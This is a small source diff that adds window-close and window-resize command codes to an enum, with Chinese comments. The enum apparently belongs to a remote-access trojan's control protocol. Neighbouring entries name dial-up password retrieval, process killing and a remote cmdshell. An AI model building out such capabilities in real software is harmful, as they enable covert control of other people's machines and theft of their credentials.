@@ -58,6 +58,8 @@ enum
 	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
 	COMMAND_PSLIST,					// 进程列表
 	COMMAND_WSLIST,					// 窗口列表
+	COMMAND_WINDOW_CLOSE,			// 关闭窗口
+	COMMAND_WINDOW_TEST,			// 最大化、最小化窗口
 	COMMAND_DIALUPASS,				// 拨号密码
 	COMMAND_KILLPROCESS,			// 关闭进程
 	COMMAND_SHELL,					// cmdshell
